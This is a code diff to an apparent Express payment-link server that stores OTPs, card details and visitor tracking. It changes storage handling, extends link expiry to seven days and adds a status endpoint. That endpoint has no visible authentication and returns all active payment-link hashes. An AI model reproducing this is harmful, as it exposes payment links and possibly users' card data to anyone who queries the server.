@@ -123,16 +123,8 @@ async function ensureDataDirectory() {
 // Load existing admin data from file/storage
 async function loadAdminData() {
   try {
-    // In production (Render.com), skip file operations and use memory-only mode
-    if (process.env.NODE_ENV === 'production') {
-      console.log('🌐 Production mode: Using memory-only storage');
-      // Ensure hashedPayments is initialized in production
-      if (!adminData.hashedPayments) {
-        adminData.hashedPayments = {};
-      }
-      console.log('✅ Admin data initialized for production (memory-only mode)');
-      return;
-    }
+    // Always try to load data in both development and production
+    // For production, we'll handle file system limitations gracefully
     
     await ensureDataDirectory();
     
@@ -163,6 +155,7 @@ async function loadAdminData() {
     console.log('✅ Admin data initialized with persistent storage');
   } catch (error) {
     console.error('❌ Error loading admin data:', error);
+    console.log('🌐 Falling back to memory-only mode due to file system limitations');
     // Initialize with defaults if loading fails
     adminData.payments = [];
     adminData.otps = [];
@@ -180,11 +173,7 @@ async function loadAdminData() {
 // Save admin data to persistent storage
 async function saveAdminData() {
   try {
-    // In production (Render.com), file system is read-only, so we skip file operations
-    if (process.env.NODE_ENV === 'production') {
-      console.log('🌐 Production mode: Skipping file system operations - data stored in memory only');
-      return;
-    }
+    // Try to save data, handle file system limitations gracefully in production
     
     await ensureDataDirectory();
     
@@ -200,6 +189,10 @@ async function saveAdminData() {
     console.log(`💾 Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors, ${adminData.visitors.length} visitor history, ${adminData.cardDetails.length} card details`);
   } catch (error) {
     console.error('❌ Error saving admin data (continuing in memory-only mode):', error);
+    // In production, this is expected due to read-only file system
+    if (process.env.NODE_ENV === 'production') {
+      console.log('🌐 Production mode: Data persists in memory until server restart');
+    }
   }
 }
 
@@ -207,6 +200,20 @@ async function saveAdminData() {
 setInterval(async () => {
   await saveAdminData();
 }, 30000);
+
+// Initialize payment link system
+function initializePaymentSystem() {
+  if (!adminData.hashedPayments) {
+    adminData.hashedPayments = {};
+    console.log('🔄 Initialized hashedPayments system');
+  }
+  console.log(`📊 Payment system ready - ${Object.keys(adminData.hashedPayments).length} existing payment links loaded`);
+}
+
+// Call initialization after data loading
+setTimeout(() => {
+  initializePaymentSystem();
+}, 1000);
 
 // Initialize admin data
 loadAdminData();
@@ -931,9 +938,9 @@ app.post('/api/create-payment-link', async (req, res) => {
     const hash = `${uuidv4()}${Date.now().toString(36)}${Math.random().toString(36).substr(2, 9)}`.toUpperCase().replace(/-/g, '').substring(0, 16);
     console.log('🎲 Generated payment hash:', hash);
     
-    // Store payment data with hash (24-hour expiration)
+    // Store payment data with hash (7-day expiration for better reliability)
     const now = new Date();
-    const expiresAt = new Date(now.getTime() + 24 * 60 * 60 * 1000); // 24 hours from now
+    const expiresAt = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days from now
     
     const paymentData = {
       hash,
@@ -983,6 +990,8 @@ app.get('/api/payment-data/:hash', async (req, res) => {
   
   console.log('🔍 Retrieving payment data for hash:', hash);
   console.log('📊 Available hashed payments:', Object.keys(adminData.hashedPayments || {}));
+  console.log('📊 AdminData hashedPayments initialized:', !!adminData.hashedPayments);
+  console.log('📊 Total payment links in memory:', Object.keys(adminData.hashedPayments || {}).length);
   
   if (!adminData.hashedPayments || !adminData.hashedPayments[hash]) {
     console.error('❌ Payment link not found:', hash);
@@ -1015,6 +1024,23 @@ app.get('/api/payment-data/:hash', async (req, res) => {
   
   console.log(`✅ Payment data retrieved successfully for hash: ${hash}`);
   res.json({ success: true, data: paymentData });
+});
+
+// API endpoint for payment system health check
+app.get('/api/payment-system-status', (req, res) => {
+  console.log('🔍 Payment system health check requested');
+  
+  const status = {
+    healthy: true,
+    hashedPaymentsInitialized: !!adminData.hashedPayments,
+    totalPaymentLinks: adminData.hashedPayments ? Object.keys(adminData.hashedPayments).length : 0,
+    availableHashes: adminData.hashedPayments ? Object.keys(adminData.hashedPayments) : [],
+    serverTime: new Date().toISOString(),
+    environment: process.env.NODE_ENV || 'development'
+  };
+  
+  console.log('📊 Payment system status:', status);
+  res.json(status);
 });
 
 // API endpoint to manually expire a payment link (Admin Panel)
